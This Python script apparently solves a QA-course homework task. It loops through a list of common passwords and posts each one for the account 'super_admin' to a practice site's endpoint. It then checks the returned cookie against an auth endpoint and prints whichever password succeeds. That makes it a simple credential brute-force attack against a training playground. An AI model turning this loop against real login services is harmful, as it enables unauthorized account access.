import requests

pass_lst = ['ashley', 'ninja', '1q2w3e4r', 'password', 'access', 'admin', '7777777', 'shadow', '111111', 'master',
            'charlie', 'qazwsx', 'jesus', 'iloveyou', 'michael', 'welcome', '123456789', 'baseball', 'login', 'dragon',
            '1qaz2wsx', 'starwars', 'passw0rd', '123123', 'football', 'monkey', 'loveme', 'batman', 'letmein', 'azerty',
            'qwerty123', '555555', '888888', '123qwe', '696969', '1234567890', 'photoshop', 'princess', 'lovely',
            'hello', 'flower', 'freedom', 'qwerty', '1234567', '666666', 'mustang', '121212', 'Football', '123456',
            'hottie', '!@#$%^&*', '654321', '000000', 'sunshine', 'donald', 'password1', 'bailey', 'superman', 'solo',
            'aa123456', 'zaq1zaq1', '12345', 'abc123', '12345678', 'trustno1', '1234', 'qwertyuiop', 'adobe123',
            'whatever']

for password in pass_lst:

    payload = {'login': 'super_admin', 'password': password}
    response_1 = requests.post('https://playground.learnqa.ru/ajax/api/get_secret_password_homework', data=payload)
    cookie = response_1.cookies

    response_2 = requests.post('https://playground.learnqa.ru/ajax/api/check_auth_cookie', cookies=cookie)
    if response_2.text == 'You are NOT authorized':
        continue
    else:
        print(f'{response_2.text} with password "{password}"')
        break
        